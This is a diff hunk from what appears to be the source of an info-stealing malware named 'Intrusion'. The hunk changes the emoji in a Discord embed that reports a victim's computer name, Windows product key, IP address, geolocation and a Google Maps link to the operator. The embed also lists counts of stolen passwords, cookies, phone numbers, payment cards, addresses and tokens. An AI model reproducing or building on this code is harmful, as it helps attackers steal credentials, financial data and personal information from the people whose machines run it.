@@ -604,21 +604,21 @@ Antivirus: {avlist}
                                         "icon_url": "https://cdn.discordapp.com/attachments/1167259290608873535/1177459014485954580/pfp.png?ex=65729529&is=65602029&hm=c59ec1d1b1629e34fad50a7339172db2c8275d580df9bebfa0837748232342df&"
                                     },
                                     "description": f'**{os.getlogin()}** ran Intrusion.\n\n'
-                                                   f'<a:2786verifyblack:1162739090534445106>  **Computer Name:** {os.getenv("COMPUTERNAME")}\n'
-                                                   f'<a:2786verifyblack:1162739090534445106> **{wname}:** {wkey if wkey else "No Product Key!"}\n'
-                                                   f'<a:06x6Luv:1162738908015099987>  **IP:** {ip} (VPN/Proxy: {requests.get("http://ip-api.com/json?fields=proxy").json()["proxy"]})\n'
-                                                   f'<a:06x6Luv:1162738908015099987>  **City:** {city}\n'
-                                                   f'<a:06x6Luv:1162738908015099987>  **Region:** {region}\n'
-                                                   f'<a:06x6Luv:1162738908015099987>  **Country:** {country}\n'
+                                                   f'<a:pink:1157448211133370409>  **Computer Name:** {os.getenv("COMPUTERNAME")}\n'
+                                                   f'<a:pink:1157448211133370409> **{wname}:** {wkey if wkey else "No Product Key!"}\n'
+                                                   f'<a:9082_gun_uzi_aestheticf4bihype:1173395853680050287>  **IP:** {ip} (VPN/Proxy: {requests.get("http://ip-api.com/json?fields=proxy").json()["proxy"]})\n'
+                                                   f'<a:9082_gun_uzi_aestheticf4bihype:1173395853680050287>  **City:** {city}\n'
+                                                   f'<a:9082_gun_uzi_aestheticf4bihype:1173395853680050287>  **Region:** {region}\n'
+                                                   f'<a:9082_gun_uzi_aestheticf4bihype:1173395853680050287>  **Country:** {country}\n'
                                                    f'[Google Maps Location]({googlemap})\n'
-                                                   f'| <a:diamondblack:1165350778685362388> Stats\n'
-                                                   f'| <a:diamondblack:1165350778685362388> Passwords Found: {self.stats["passwords"]}\n'
-                                                   f'| <a:diamondblack:1165350778685362388> Cookies Found: {self.stats["cookies"]}\n'
-                                                   f'| <a:diamondblack:1165350778685362388> Phone Numbers Found: {self.stats["phones"]}\n'
-                                                   f'| <a:diamondblack:1165350778685362388> Cards Found: {self.stats["cards"]}\n'
-                                                   f'| <a:diamondblack:1165350778685362388> Addresses Found: {self.stats["addresses"]}\n'
-                                                   f'| <a:diamondblack:1165350778685362388> Tokens Found: {self.stats["tokens"]}\n'
-                                                   f'| <a:diamondblack:1165350778685362388> Time: {"{:.2f}".format(time.time() - self.starttime)}s',
+                                                   f'| <:1_b7:1117326289683087452> Stats\n'
+                                                   f'| <:1_b7:1117326289683087452> Passwords Found: {self.stats["passwords"]}\n'
+                                                   f'| <:1_b7:1117326289683087452> Cookies Found: {self.stats["cookies"]}\n'
+                                                   f'| <:1_b7:1117326289683087452> Phone Numbers Found: {self.stats["phones"]}\n'
+                                                   f'| <:1_b7:1117326289683087452> Cards Found: {self.stats["cards"]}\n'
+                                                   f'| <:1_b7:1117326289683087452> Addresses Found: {self.stats["addresses"]}\n'
+                                                   f'| <:1_b7:1117326289683087452> Tokens Found: {self.stats["tokens"]}\n'
+                                                   f'| <:1_b7:1117326289683087452> Time: {"{:.2f}".format(time.time() - self.starttime)}s',
                                     "inline": False,
                                     "color": 0x00000,
                                     "timestamp": time.strftime("%Y-%m-%dT%H:%M:%S.000Z", time.gmtime()),
